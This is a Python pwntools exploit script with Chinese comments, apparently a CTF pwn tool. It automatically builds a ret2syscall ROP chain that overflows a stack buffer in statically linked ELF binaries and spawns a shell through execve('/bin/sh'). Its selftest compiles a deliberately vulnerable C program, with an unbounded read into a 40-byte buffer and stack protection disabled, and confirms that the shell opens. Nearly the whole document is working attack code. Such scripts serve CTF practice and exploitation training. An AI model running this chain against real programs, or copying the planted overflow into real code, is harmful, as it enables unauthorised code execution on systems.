# -*- coding: utf-8 -*-
# 脚本名称: ret2syscall（静态编译程序 ROP 构造 execve("/bin/sh",0,0)）
# 方向: Pwn（ROP / syscall）
# 简介: 静态链接的程序里没有 system，但能直接找 syscall; ret 与
#       pop eax/rdi/rsi/rdx; ret，通过 ROP 链设置
#       eax=59(64位) / 11(32位)，rdi="/bin/sh"，rsi=0，rdx=0 后 syscall。
#       脚本用 ROPgadget 思路自动搜索所需 gadget 并拼链。
# 用法:
#   python ret2syscall_rop.py ./static_pwn --offset 72
#   python ret2syscall_rop.py ./static_pwn32 --offset 44 --arch 32
#   python ret2syscall_rop.py --selftest
# 依赖: pip install pwntools；目标为静态编译 ELF（file 看 statically linked）
from pwn import *


def build_chain(binpath, offset, bits=64):
    context(os="linux", arch="amd64" if bits == 64 else "i386")
    elf = ELF(binpath, checksec=False)
    rop = ROP(elf)
    binsh = next(elf.search(b"/bin/sh\x00"), None)
    if not binsh:
        raise SystemExit("[-] 程序中没有 /bin/sh 字符串，可写入 bss 后再用")
    if bits == 64:
        syscall = rop.find_gadget(["syscall", "ret"])[0]
        rop(rax=59, rdi=binsh, rsi=0, rdx=0)
        rop.raw(syscall)
    else:
        # 32 位：int 0x80；eax=11, ebx=binsh, ecx=0, edx=0
        int80 = rop.find_gadget(["int 0x80"])[0]
        rop(eax=11, ebx=binsh, ecx=0, edx=0)
        rop.raw(int80)
    chain = rop.chain()
    log.info("gadget 链:\n%s", rop.dump())
    return b"A" * offset + chain


def selftest():
    import os
    import sys
    if sys.platform != "linux":
        print("[-] 本自测需 Linux 环境（gcc 静态编译 ELF + ROP），Windows/macOS 跳过")
        return
    import subprocess
    import tempfile
    context(os="linux", arch="amd64")
    d = tempfile.mkdtemp()
    src = os.path.join(d, "s.c")
    binp = os.path.join(d, "static_v")
    open(src, "w").write(r'''
#include <unistd.h>
void vuln(){ char b[40]; read(0,b,400); }
int main(){ vuln(); return 0; }
int give(){ const char*p="/bin/sh"; return p[0]; }
''')
    try:
        cc = subprocess.run(["gcc", "-static", "-fno-stack-protector", "-no-pie",
                             "-o", binp, src], capture_output=True, text=True)
    except FileNotFoundError:
        print("[-] 需要 gcc（Linux/WSL/Kali），跳过编译自测"); return
    if cc.returncode != 0:
        print("[-] 需要 gcc 与静态库(musl-tools/libc6-dev)，跳过:", cc.stderr[:150])
        return
    payload = build_chain(binp, 72)
    io = process(binp)
    io.send(payload)
    io.sendline(b"echo SYSRET_OK")
    try:
        out = io.recvuntil(b"SYSRET_OK", timeout=8)
        assert b"SYSRET_OK" in out
        print("[+] selftest OK，execve('/bin/sh') 链可执行")
    except Exception:
        print("[-] 自测未收到回显（环境差异），请手工 gdb 验证 gadget 链")
    io.close()


def main():
    import sys
    if "--selftest" in sys.argv:
        selftest(); return
    binpath = sys.argv[1] if len(sys.argv) > 1 else "./pwn"
    off, bits = 72, 64
    it = iter(sys.argv[2:])
    for a in it:
        if a == "--offset": off = int(next(it))
        elif a == "--arch": bits = int(next(it))
    payload = build_chain(binpath, off, bits)
    print("[*] payload hex:", payload.hex())
    io = process(binpath)
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    main()
